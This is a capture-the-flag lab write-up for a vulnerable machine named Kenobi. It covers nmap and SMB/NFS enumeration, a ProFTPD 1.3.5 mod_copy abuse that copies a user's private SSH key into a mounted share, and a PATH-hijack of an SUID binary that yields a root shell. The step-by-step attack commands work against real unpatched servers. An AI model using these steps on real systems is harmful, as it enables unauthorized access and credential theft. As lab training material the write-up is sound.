# Intro



## Topics for this room 

* Samba Share
* vulnerable proftpd 
* Privesc via an SUID binary



1. [Recon - nmap](#Recon-nmap) 
2. [Recon - smb](#Recon - smb)
3. [log.txt](#log.txt)
4. [Recon - RPC](#Recon - RPC)
5. [ftp](#ftp)
6. [privesc](#privesc)



# Recon-nmap

```bash
# Nmap 7.91 scan initiated Sat Mar 13 22:20:22 2021 as: nmap -sC -sV -p- -oA kenobi 10.10.139.2
Nmap scan report for 10.10.139.2
Host is up (0.015s latency).
Not shown: 65524 closed ports
PORT      STATE SERVICE     VERSION
21/tcp    open  ftp         ProFTPD 1.3.5
22/tcp    open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b3:ad:83:41:49:e9:5d:16:8d:3b:0f:05:7b:e2:c0:ae (RSA)
|   256 f8:27:7d:64:29:97:e6:f8:65:54:65:22:f7:c8:1d:8a (ECDSA)
|_  256 5a:06:ed:eb:b6:56:7e:4c:01:dd:ea:bc:ba:fa:33:79 (ED25519)
80/tcp    open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/admin.html
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      38343/tcp   mountd
|   100005  1,2,3      47489/tcp6  mountd
|   100005  1,2,3      50139/udp   mountd
|   100005  1,2,3      58687/udp6  mountd
|   100021  1,3,4      34386/udp6  nlockmgr
|   100021  1,3,4      39433/tcp6  nlockmgr
|   100021  1,3,4      39671/tcp   nlockmgr
|   100021  1,3,4      58668/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
2049/tcp  open  nfs_acl     2-3 (RPC #100227)
38343/tcp open  mountd      1-3 (RPC #100005)
39671/tcp open  nlockmgr    1-4 (RPC #100021)
45321/tcp open  mountd      1-3 (RPC #100005)
55545/tcp open  mountd      1-3 (RPC #100005)
Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m01s, deviation: 3h27m50s, median: 1s
|_nbstat: NetBIOS name: KENOBI, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: kenobi
|   NetBIOS computer name: KENOBI\x00
|   Domain name: \x00
|   FQDN: kenobi
|_  System time: 2021-03-13T16:20:49-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-03-13T22:20:49
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 13 22:20:48 2021 -- 1 IP address (1 host up) scanned in 25.81 seconds
```



# Recon SMB



## Recon - nmap

```bash
sudo nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.45.110
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 20:19 IST
Nmap scan report for 10.10.45.110
Host is up (0.013s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.45.110\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (kenobi server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.45.110\anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\home\kenobi\share
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.45.110\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>

Nmap done: 1 IP address (1 host up) scanned in 3.11 seconds
```



## Recon - smbmap

```bash
$ smbmap -H 10.10.45.110
[+] Guest session       IP: 10.10.45.110:445    Name: 10.10.45.110                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        anonymous                                               READ ONLY
        IPC$                                                    NO ACCESS       IPC Service (kenobi server (Samba, Ubuntu))
```



## Retrieve file from share \anonymous

```bash
$ smbclient \\\\10.10.45.110\\anonymous                                                                                                                                        1 ⨯
Enter WORKGROUP\boolean's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Sep  4 11:49:09 2019
  ..                                  D        0  Wed Sep  4 11:56:07 2019
  log.txt                             N    12237  Wed Sep  4 11:49:09 2019

                9204224 blocks of size 1024. 6877092 blocks available
smb: \> get log.txt
getting file \log.txt of size 12237 as log.txt (189.7 KiloBytes/sec) (average 189.7 KiloBytes/sec)
smb: \> 
```



# Information gathered from log.txt



## SSH Information

```bash
$ cat log.txt          
Generating public/private rsa key pair.                                                                  
Enter file in which to save the key (/home/kenobi/.ssh/id_rsa):                                          
Created directory '/home/kenobi/.ssh'.                                                                   
Enter passphrase (empty for no passphrase): 
Enter same passphrase again:                                                                             
Your identification has been saved in /home/kenobi/.ssh/id_rsa.                                                                                                                                                    
Your public key has been saved in /home/kenobi/.ssh/id_rsa.pub.
The key fingerprint is:                                                                                  
SHA256:C17GWSl/v7KlUZrOwWxSyk+F7gYhVzsbfqkCIkr2d7Q kenobi@kenobi     
The key's randomart image is:                                                                            
+---[RSA 2048]----+                                 
|                 |                                                                                      
|           ..    |                                                                                      
|        . o. .   |                                                                                      
|       ..=o +.   |                                                                                      
|      . So.o++o. |                
|  o ...+oo.Bo*o  |                                                                                      
| o o ..o.o+.@oo  |                                                                                      
|  . . . E .O+= . |                                                                                      
|     . .   oBo.  |                          
+----[SHA256]-----+                                     
```



## ftp Information

```bash
# This is a basic ProFTPD configuration file (rename it to 
# 'proftpd.conf' for actual use.  It establishes a single server
# and a single anonymous login.  It assumes that you have a user/group
# "nobody" and "ftp" for normal operation and anon.

ServerName                      "ProFTPD Default Installation"                                           
ServerType                      standalone                                                               
DefaultServer                   on                                                                       
# Port 21 is the standard FTP port.                 
Port                            21                  
                                                                                 
# Don't use IPv6 support by default.
UseIPv6                         off

# Umask 022 is a good standard umask to prevent new dirs and files
# from being group and world writable.
Umask                           022

# To prevent DoS attacks, set the maximum number of child processes
# to 30.  If you need to allow more than 30 concurrent connections
# at once, simply increase this value.  Note that this ONLY works
# in standalone mode, in inetd mode you should use an inetd server
# that allows you to limit maximum number of processes per service
# (such as xinetd).
MaxInstances                    30

# Set the user and group under which the server will run.
User                            kenobi
Group                           kenobi

# To cause every FTP user to be "jailed" (chrooted) into their home
# directory, uncomment this line.
#DefaultRoot ~

# Normally, we want files to be overwriteable.
AllowOverwrite          on

# Bar use of SITE CHMOD by default
<Limit SITE_CHMOD>
  DenyAll
</Limit>

# A basic anonymous configuration, no upload directories.  If you do not
# want anonymous users, simply delete this entire <Anonymous> section.
<Anonymous ~ftp>
  User                          ftp
  Group                         ftp

  # We want clients to be able to login with "anonymous" as well as "ftp"
  UserAlias                     anonymous ftp

  # Limit the maximum number of anonymous logins
  MaxClients                    10

  # We want 'welcome.msg' displayed at login, and '.message' displayed
  # in each newly chdired directory.
  DisplayLogin                  welcome.msg
  DisplayChdir                  .message

  # Limit WRITE everywhere in the anonymous chroot
  <Limit WRITE>
    DenyAll
  </Limit>
</Anonymous>
```



# RPC Recon



## nmap

```bash
$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.45.110
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 20:38 IST
Nmap scan report for 10.10.45.110
Host is up (0.013s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /var *

Nmap done: 1 IP address (1 host up) scanned in 0.32 seconds
```

Mount discovered /var



# ftp



## Step 1 - Connect to the ftp port via netcat

```bash
$ nc 10.10.45.110 21                                               
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.45.110]
```



## Step 2 - Search for exploits 



```bash
$ searchsploit proftpd 
[...]
ProFTPd 1.3.5 - 'mod_copy' Command Execution (Metasploit) | linux/remote/37262.rb
ProFTPd 1.3.5 - 'mod_copy' Remote Command Execution     | linux/remote/36803.py
ProFTPd 1.3.5 - File Copy                               | linux/remote/36742.txt
[...]
```



The exploit 36742 allows for any file to be copied and downloaded as long as you know about it and where it exists. Using the information from the log.txt file we know that kenobi's ssh key is in the path /home/kenobi/.ssh/id_rsa. 
Combining this information information from the rpc enumeration, where we found that the var directory is a mount and therefore we can copy kenobi's ssh key to the var directory.



```bash
$ nc 10.10.45.110 21                                               
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.45.110]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO /var/tmp/id_rsa
250 Copy successful
```

### Note:

* SITE CPFR - Copy From 
* SITE CPTO - Copy To



## Step 3 - Mount the var directory



```bash
(boolean㉿kalibox)[~/thm/kenobi]$ sudo mount 10.10.45.110:/var /mnt/kenobi                                                                                                                        
(boolean㉿kalibox)[~/thm/kenobi]$ ll /mnt/kenobi/tmp
total 20
-rw-r--r-- 1 boolean boolean 1675 Apr 28 20:55 id_rsa
drwx------ 3 root    root    4096 Apr 28 20:17 systemd-private-0f4c15abb56140b88d8ebaa70883b26c-systemd-timesyncd.service-oA2y7u
drwx------ 3 root    root    4096 Sep  4  2019 systemd-private-2408059707bc41329243d2fc9e613f1e-systemd-timesyncd.service-a5PktM
drwx------ 3 root    root    4096 Sep  4  2019 systemd-private-6f4acd341c0b40569c92cee906c3edc9-systemd-timesyncd.service-z5o4Aw
drwx------ 3 root    root    4096 Sep  4  2019 systemd-private-e69bbb0653ce4ee3bd9ae0d93d2a5806-systemd-timesyncd.service-zObUdn
```



## Step 4 - Copy id_rsa file



With the id_rsa we are able to ssh to the server as user kenobi

```bash
$ ssh -i id_rsa kenobi@10.10.45.110 
```



# Privesc



## Path Variable Manipulation



### SUID / SGID / Sticky bit explanation



![https://i.imgur.com/LN2uOCJ.png](https://i.imgur.com/LN2uOCJ.png)



| Permission | On Files                                                     | On Directories                                            |
| ---------- | ------------------------------------------------------------ | --------------------------------------------------------- |
| SUID bit   | User executes the file with permissions of the file owner    | -                                                         |
| SGID bit   | User executes the file with the permission of the group owner. | File created in directory gets the same group owner.      |
| Sticky bit | No meaning                                                   | Users are prevented from deleting files from other users. |



### Search for files that contain SUID bit

```bash
kenobi@kenobi:~$  find / -perm -u=s -type f 2>/dev/null
/sbin/mount.nfs
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/gpasswd
/usr/bin/menu
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/at
/usr/bin/newgrp
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
/bin/su
/bin/ping6
```

Most of the above files look standard unix, however, /usr/bin/menu looks out of place.



## Examining /usr/bin/menu

Running the command 'strings' , this shows that the binary runs the commands, ipconfig, curl and uname. However, when menu calls this function they use the relative path rather than an absolute path. 

```bash
kenobi@kenobi:~$ ll -a /usr/bin/menu 
-rwsr-xr-x 1 root root 8880 Sep  4  2019 /usr/bin/menu*
```

Also it shows that the menu command runs as root.



## Getting a shell as root



Copy /bin/sh to current directory and rename as curl.

```bash
kenobi@kenobi:/tmp$ echo /bin/sh > curl 
kenobi@kenobi:/tmp$ chmod 777 curl
kenobi@kenobi:/tmp$ export PATH=/tmp:$PATH
kenobi@kenobi:/tmp$ /usr/bin/menu

***************************************
1. status check
2. kernel version
3. ifconfig
** Enter your choice :1
# whoami
root
# 
```